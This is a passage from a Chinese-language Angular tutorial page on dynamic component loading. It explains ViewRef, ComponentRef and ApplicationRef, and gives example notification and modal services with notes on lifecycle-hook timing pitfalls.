    <span class="token keyword">this</span><span class="token punctuation">.</span>componentRef <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>container<span class="token punctuation">.</span><span class="token function">createComponent</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>resolver<span class="token punctuation">.</span><span class="token function">resolveComponentFactory</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>injectComponent<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>instance <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>componentRef<span class="token punctuation">.</span>instance<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p><code>&lt;template&gt;</code> 模板元素，已经被 Angular 解析并封装成 TemplateRef 实例，通过 TemplateRef 实例，我们可以方便地创建内嵌视图(Embedded View)，Component 组件中定义的 <code>&lt;template&gt;</code> 模板元素渲染后会被移除。</p> <blockquote><p>Angular支持的 View(视图) 类型</p></blockquote> <ul><li>Embedded Views - Template 模板元素</li> <li>Host Views - Component 组件</li></ul> <ol><li>创建 Embedded View</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">ngAfterViewInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> view <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>tpl<span class="token punctuation">.</span><span class="token function">createEmbeddedView</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><ol start="2"><li>创建 Host View</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">private</span> injector<span class="token operator">:</span> Injector<span class="token punctuation">,</span>
    <span class="token keyword">private</span> r<span class="token operator">:</span> ComponentFactoryResolver</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> factory <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>r<span class="token punctuation">.</span><span class="token function">resolveComponentFactory</span><span class="token punctuation">(</span>AppComponent<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> componentRef <span class="token operator">=</span> factory<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>injector<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> view <span class="token operator">=</span> componentRef<span class="token punctuation">.</span>hostView<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><h2 id="viewref-embeddedviewref"><a href="#viewref-embeddedviewref" class="header-anchor">#</a> ViewRef/EmbeddedViewRef</h2> <p>ViewRef 用于表示 Angular View(视图)，视图是可视化的 UI 界面。EmbeddedViewRef 继承于 ViewRef，用于表示 <code>&lt;template&gt;</code> 模板元素中定义的 UI 元素。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// ViewRef</span>
<span class="token comment">// @angular/core/src/linker/view_ref.d.ts</span>
<span class="token keyword">export</span> declare abstract <span class="token keyword">class</span> <span class="token class-name">ViewRef</span> <span class="token punctuation">{</span>
    destroyed<span class="token operator">:</span> boolean<span class="token punctuation">;</span>
    abstract <span class="token function">onDestroy</span><span class="token punctuation">(</span>callback<span class="token operator">:</span> Function<span class="token punctuation">)</span><span class="token operator">:</span> any<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">//EmbeddedViewRef</span>
<span class="token comment">// @angular/core/src/linker/view_ref.d.ts</span>
<span class="token keyword">export</span> declare abstract <span class="token keyword">class</span> <span class="token class-name">EmbeddedViewRef</span><span class="token operator">&lt;</span><span class="token constant">C</span><span class="token operator">&gt;</span> <span class="token keyword">extends</span> <span class="token class-name">ViewRef</span> <span class="token punctuation">{</span>
    context<span class="token operator">:</span> <span class="token constant">C</span><span class="token punctuation">;</span>
    rootNodes<span class="token operator">:</span> any<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 保存&lt;template&gt;模板中定义的元素</span>
    abstract <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span> <span class="token comment">// 用于销毁视图</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><div class="custom-block tip"><p class="custom-block-title">View (视图) 由三个部分组成</p> <ul><li>Elements - 元素</li> <li>Bindings - 绑定</li> <li>Events - 事件</li></ul></div> <h2 id="componentref"><a href="#componentref" class="header-anchor">#</a> ComponentRef</h2> <p>表示通过ComponentFactory创建的组件的实例。ComponentRef提供对组件实例的访问以及与此组件实例相关的其他对象，并允许您通过destroy方法销毁组件实例。抽象类定义如下：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>abstract <span class="token keyword">class</span> <span class="token class-name">ComponentRef</span><span class="token operator">&lt;</span><span class="token constant">C</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span>
  abstract location<span class="token operator">:</span> ElementRef <span class="token comment">// 组件实例的宿主元素所在的位置</span>
  abstract injector<span class="token operator">:</span> Injector <span class="token comment">// 组件实例存在的注射器</span>
  abstract instance<span class="token operator">:</span> <span class="token constant">C</span> <span class="token comment">// 组件实例</span>
  abstract hostView<span class="token operator">:</span> ViewRef <span class="token comment">// 组件实例的宿主视图ViewRef</span>
  abstract changeDetectorRef<span class="token operator">:</span> ChangeDetectorRef <span class="token comment">// 组件的ChangeDetectorRef</span>
  abstract componentType<span class="token operator">:</span> Type<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span> <span class="token comment">// 组件类型</span>
  abstract <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token comment">// 销毁组件实例及其附加数据</span>
  abstract <span class="token function">onDestroy</span><span class="token punctuation">(</span>callback<span class="token operator">:</span> Function<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token comment">// 允许注册将在组件销毁时调用的回调。</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>一个ViewContainerRef除了可以动态加载ComponentRef之外，Angular还提供了模版（TemplateRef ）的动态加载。TemplateRef和ComponentRef最大的区别就在于TemplateRef只是提供数据的展示，而ComponentRef还有控制器（Controller）的功能。</p> <ul><li>injector: Injector 我们在使用一个命令式引导一个Component之前需要在NgModule中的declarations部分声明这个Component，在使用这个Component时，通过依赖注入为Component提供的Service实际上是在NgModule声明，并且由NgModule提供的——NgModule就是Injector。所以这个Injector一般就是你在使用这个Component时所在的NgModule。 总结一句话，就是在动态加载Component时，你需要在哪个宿主（Component Host）下工作，那就获取哪个宿主的Injector，让宿主的Injector为你提供服务（provide service）。</li> <li>location: ElementRef 这个命名很容易让人困惑。实际上它是需要被动态加载的组件（Component）的视图（View）部分。它的其中一个属性叫做rootNodes，就是一个Native Element。</li> <li>hostView: ViewRef 上面已经存在一个ElementRef是为了提供视图的，而这个ViewRef看起来更像是视图的引用。没错，这很容易混淆。实际上ViewRef是用来提供数据检测和视图更新的。我们来看一下ViewRef的定义。</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code>abstract <span class="token keyword">class</span> <span class="token class-name">ViewRef</span> <span class="token keyword">extends</span> <span class="token class-name">ChangeDetectorRef</span> <span class="token punctuation">{</span>
	abstract <span class="token keyword">get</span> destroyed<span class="token operator">:</span> boolean
	abstract <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span>
	abstract <span class="token function">onDestroy</span><span class="token punctuation">(</span>callback<span class="token operator">:</span> Function<span class="token punctuation">)</span><span class="token operator">:</span> any
	<span class="token comment">// inherited from core/ChangeDetectorRef</span>
	abstract <span class="token function">markForCheck</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span>
	abstract <span class="token function">detach</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span>
	abstract <span class="token function">detectChanges</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span>
	abstract <span class="token function">checkNoChanges</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span>
	abstract <span class="token function">reattach</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>这三个部分就是一个Component最重要的组成部分：injector提供服务，location管理原生视图，hostView负责数据-视图更新。</p> <h3 id="生命周期的陷阱"><a href="#生命周期的陷阱" class="header-anchor">#</a> 生命周期的陷阱</h3> <p>我们都知道，加载一个Component之前，需要为Component提供一个宿主（Host）。但是如果对生命周期不了解就可能会遇到这样那样的问题。我们现在来讨论几种场景下可能会碰到的问题。</p> <p>场景一：我们通过Service负责全局的Notification展示，在你需要的时候弹出一个Notification组件。如果我们的Notification需要寄宿在根部组件App Component，那么具体要等到什么时候才可以调用动态加载呢？</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Injectable<span class="token punctuation">,</span> ComponentFactoryResolver<span class="token punctuation">,</span> Injector<span class="token punctuation">,</span> ApplicationRef<span class="token punctuation">,</span> ComponentRef <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token punctuation">{</span> NaNotificationConfig <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./na-notification.config'</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token punctuation">{</span> NaNotificationComponent <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./na-notification.component'</span><span class="token punctuation">;</span>
@<span class="token function">Injectable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">NaNotificationService</span> <span class="token punctuation">{</span>
	<span class="token function">constructor</span><span class="token punctuation">(</span>
		<span class="token parameter"><span class="token keyword">private</span> componentFactoryResolver<span class="token operator">:</span> ComponentFactoryResolver<span class="token punctuation">,</span>
		<span class="token keyword">private</span> injector<span class="token operator">:</span> Injector<span class="token punctuation">,</span>
		<span class="token keyword">private</span> appRef<span class="token operator">:</span> ApplicationRef</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">public</span> <span class="token function">show</span><span class="token punctuation">(</span>config<span class="token operator">:</span> NaNotificationConfig<span class="token punctuation">)</span><span class="token operator">:</span> Promise<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
			<span class="token keyword">let</span> notification <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>componentFactoryResolver
				<span class="token punctuation">.</span><span class="token function">resolveComponentFactory</span><span class="token punctuation">(</span>NaNotificationComponent<span class="token punctuation">)</span>
				<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>injector<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">let</span> timeout <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
				<span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">dismiss</span><span class="token punctuation">(</span>notification<span class="token punctuation">,</span> resolve<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span><span class="token punctuation">,</span> config<span class="token punctuation">.</span>duration<span class="token punctuation">)</span><span class="token punctuation">;</span>
			notification<span class="token punctuation">.</span>instance<span class="token punctuation">.</span>config <span class="token operator">=</span> config<span class="token punctuation">;</span>
			notification<span class="token punctuation">.</span>instance<span class="token punctuation">.</span>onDismiss<span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
				<span class="token function">clearTimeout</span><span class="token punctuation">(</span>timeout<span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">dismiss</span><span class="token punctuation">(</span>notification<span class="token punctuation">,</span> resolve<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">this</span><span class="token punctuation">.</span>appRef<span class="token punctuation">.</span>components<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>location<span class="token punctuation">.</span>nativeElement<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>notification<span class="token punctuation">.</span>location<span class="token punctuation">.</span>nativeElement<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">this</span><span class="token punctuation">.</span>appRef<span class="token punctuation">.</span><span class="token function">attachView</span><span class="token punctuation">(</span>notification<span class="token punctuation">.</span>hostView<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">private</span> <span class="token function">dismiss</span><span class="token punctuation">(</span>notification<span class="token operator">:</span> ComponentRef<span class="token operator">&lt;</span>NaNotificationComponent<span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token function-variable function">onDismiss</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">value<span class="token operator">?</span><span class="token operator">:</span> any</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> any<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">this</span><span class="token punctuation">.</span>appRef<span class="token punctuation">.</span><span class="token function">detachView</span><span class="token punctuation">(</span>notification<span class="token punctuation">.</span>hostView<span class="token punctuation">)</span><span class="token punctuation">;</span>
		notification<span class="token punctuation">.</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">onDismiss</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br></div></div><p>你会发现一个问题，我在AppComponent中的ngOnInit()、ngAfterContentInit()、ngAfterViewInit()这三个生命周期钩子中去调用</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">this</span><span class="token punctuation">.</span>notification<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
	message<span class="token operator">:</span> &quot;show notification”<span class="token punctuation">,</span>
	duration<span class="token operator">:</span> <span class="token number">3000</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
	console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;notification dismiss&quot;</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>时，都会告诉我this.appRef.components[0]不存在，因为这个组件并没有真正意义上被添加进app中——即AppComponent的ComponentRef并没有被添加到ApplicationRef中。所以你需要在使用的时候注意避免这种情况。</p> <p>场景二：我们通过一个Service负责全局自定义模态窗（Modal）的展示，我们需要为Service负责生成一个宿主，并且需要通过传入一个Component作为要展示的弹窗组件。那么，这个Component需要在宿主的什么生命周期时被动态加载进入宿主的ViewContainerRef呢？我直接说答案，就是ngAfterContentInit()。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Injectable<span class="token punctuation">,</span> ComponentFactoryResolver<span class="token punctuation">,</span> Injector<span class="token punctuation">,</span> ApplicationRef<span class="token punctuation">,</span> Type<span class="token punctuation">,</span> ViewRef<span class="token punctuation">,</span> ComponentRef <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token punctuation">{</span> NaModal <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./na-modal'</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token punctuation">{</span> NaModalComponent <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./na-modal.component'</span><span class="token punctuation">;</span>
@<span class="token function">Injectable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">NaModalService</span> <span class="token punctuation">{</span>
	<span class="token function">constructor</span><span class="token punctuation">(</span>
		<span class="token parameter"><span class="token keyword">private</span> componentFactoryResolver<span class="token operator">:</span> ComponentFactoryResolver<span class="token punctuation">,</span>
		<span class="token keyword">private</span> injector<span class="token operator">:</span> Injector<span class="token punctuation">,</span>
		<span class="token keyword">private</span> appRef<span class="token operator">:</span> ApplicationRef</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">public</span> <span class="token function">open</span><span class="token punctuation">(</span>modal<span class="token operator">:</span> Type<span class="token operator">&lt;</span>NaModal<span class="token operator">&gt;</span><span class="token punctuation">,</span> data<span class="token operator">?</span><span class="token operator">:</span> any<span class="token punctuation">)</span><span class="token operator">:</span> Promise<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
			<span class="token keyword">let</span> modalHost <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>componentFactoryResolver
				<span class="token punctuation">.</span><span class="token function">resolveComponentFactory</span><span class="token punctuation">(</span>NaModalComponent<span class="token punctuation">)</span>
				<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>injector<span class="token punctuation">)</span><span class="token punctuation">;</span>
				console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>injector<span class="token punctuation">)</span>
			modalHost<span class="token punctuation">.</span>instance<span class="token punctuation">.</span>onAfterContentInit<span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
				<span class="token keyword">let</span> modalContainerRef <span class="token operator">=</span> modalHost<span class="token punctuation">.</span>instance<span class="token punctuation">.</span>viewContainerRef<span class="token punctuation">;</span>
				modalContainerRef<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token keyword">let</span> modalComponent <span class="token operator">=</span> modalContainerRef<span class="token punctuation">.</span><span class="token function">createComponent</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>componentFactoryResolver<span class="token punctuation">.</span><span class="token function">resolveComponentFactory</span><span class="token punctuation">(</span>modal<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>modalContainerRef<span class="token punctuation">)</span><span class="token punctuation">;</span>
				modalComponent<span class="token punctuation">.</span>instance<span class="token punctuation">.</span>data <span class="token operator">=</span> data<span class="token punctuation">;</span>
				modalComponent<span class="token punctuation">.</span>instance<span class="token punctuation">.</span>onConfirm<span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">value<span class="token operator">?</span><span class="token operator">:</span> any</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
					<span class="token function">resolve</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">dismiss</span><span class="token punctuation">(</span>modalHost<span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				modalComponent<span class="token punctuation">.</span>instance<span class="token punctuation">.</span>onCancel<span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
					<span class="token function">reject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">dismiss</span><span class="token punctuation">(</span>modalHost<span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span><span class="token punctuation">)</span>
			modalHost<span class="token punctuation">.</span>instance<span class="token punctuation">.</span>onModalContainerDismiss<span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
				<span class="token function">reject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">dismiss</span><span class="token punctuation">(</span>modalHost<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span><span class="token punctuation">)</span>
			<span class="token keyword">this</span><span class="token punctuation">.</span>appRef<span class="token punctuation">.</span>components<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>location<span class="token punctuation">.</span>nativeElement<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>modalHost<span class="token punctuation">.</span>location<span class="token punctuation">.</span>nativeElement<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">this</span><span class="token punctuation">.</span>appRef<span class="token punctuation">.</span><span class="token function">attachView</span><span class="token punctuation">(</span>modalHost<span class="token punctuation">.</span>hostView<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">private</span> <span class="token function">dismiss</span><span class="token punctuation">(</span><span class="token parameter">modalHost<span class="token operator">:</span> ComponentRef<span class="token operator">&lt;</span>NaModalComponent<span class="token operator">&gt;</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">this</span><span class="token punctuation">.</span>appRef<span class="token punctuation">.</span><span class="token function">detachView</span><span class="token punctuation">(</span>modalHost<span class="token punctuation">.</span>hostView<span class="token punctuation">)</span><span class="token punctuation">;</span>
		modalHost<span class="token punctuation">.</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br></div></div><p>动态加载的Model如果需要绑定外部数据（@Input），那么就必须要在ngAfterContentInit()生命周期中进行组件的动态加载。在ngAfterViewInit()时进行数据的更改，则会抛出ExpressionChangedAfterItHasBeenCheckedError: Expression has changed after it was checked.这样一个异常。</p> <div class="custom-block tip"><p class="custom-block-title">温馨提示</p> <p>在Angular Material中，实际上Snack（就是Notification，或者Toast）和Dialog的宿主就是一个TemplateRef。</p></div> <h2 id="applicationref"><a href="#applicationref" class="header-anchor">#</a> ApplicationRef</h2> <p>ApplicationRef有三个作用：</p> <ul><li>可以通过appRef.tick()来全局性调用变化检测( ApplicationRef.tick() - 检查所有组件树)</li> <li>可以将视图用attachView()包含到变化检测中 用detachView()将视图移除变化检测</li> <li>利用componentTypes和components提供了一个注册组件和组件类型的列表，和一些其他变更检测的相关信息</li></ul> <p>实例1：下面我们不用ViewContainerRef，动态插入一个组件到一个特定的DOM节。假定有两个空白的组件：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;div id=&quot;container&quot;&gt;
      &lt;h1&gt;My Component&lt;/h1&gt;
    &lt;/div&gt;
   </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
  selector<span class="token operator">:</span> <span class="token string">'my-app'</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  template<span class="token operator">:</span> <span class="token string">'&lt;p&gt;{{text}}&lt;/p&gt;'</span><span class="token punctuation">,</span>
  selector<span class="token operator">:</span> <span class="token string">'simple-cmp'</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">SimpleComponent</span> <span class="token punctuation">{</span> <span class="token keyword">public</span> text<span class="token operator">=</span><span class="token string">'Hello World!'</span> <span class="token punctuation">}</span>
